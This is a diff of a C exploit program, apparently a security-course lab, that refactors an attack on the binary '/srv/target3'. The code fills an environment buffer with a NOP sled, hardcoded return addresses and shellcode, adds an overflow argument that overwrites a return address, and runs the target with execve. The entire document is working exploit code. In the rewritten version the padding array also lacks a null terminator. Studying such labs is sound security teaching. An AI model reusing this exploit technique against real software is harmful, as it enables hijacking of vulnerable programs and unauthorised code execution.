@@ -5,34 +5,40 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-const char* target = "/srv/target3";
-const int envSize = 400;
-const uint32_t baseAddr = 0xffffdec0;
-const int nopSize = 201;
-const char nopChar = 0x90;
-const int retOffset = 4;
+#define TARGET "/srv/target3"
 
-const uint32_t startAddr = baseAddr + retOffset;
-const uint32_t secondAddr = baseAddr + 2 * retOffset;
-const char padding[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
+const int ENV_SIZE = 400;
+const int NOP_SIZE = 201;
+const uint32_t BASE_ADDR = 0xffffdec0;
+const int RET_OFFSET = 4;
 
-void prepEnv(char *e) {
-    memset(e, nopChar, envSize - 1);
-    *((uint32_t *)(e)) = startAddr;
-    *((uint32_t *)(e + retOffset)) = secondAddr;
-    memcpy(e + nopSize, shellcode, sizeof(shellcode));
-    e[envSize - 1] = '\0';
+void prepareEnv(char *env) {
+    memset(env, 0x90, ENV_SIZE - 1);
+    *((uint32_t *)(env)) = BASE_ADDR + RET_OFFSET;
+    *((uint32_t *)(env + RET_OFFSET)) = BASE_ADDR + 2 * RET_OFFSET;
+    memcpy(env + NOP_SIZE, shellcode, sizeof(shellcode));
+    env[ENV_SIZE - 1] = '\0';
 }
 
 int main(void) {
-    char *args[] = {target, padding, NULL};
-    char env[envSize];
+    char *args[3];
+    char *envp[2];
+    char env[ENV_SIZE];
+    char padding[20];
 
-    prepEnv(env);
+    prepareEnv(env);
 
-    char *envp[] = {env};
+    memset(padding, 0x90, 16);
+    *((uint32_t *)(padding + 16)) = BASE_ADDR;
 
-    execve(target, args, envp);
+    args[0] = TARGET;
+    args[1] = padding;
+    args[2] = NULL;
+
+    envp[0] = env;
+    envp[1] = NULL;
+
+    execve(TARGET, args, envp);
     fprintf(stderr, "execve failed.\n");
 
     return 0;
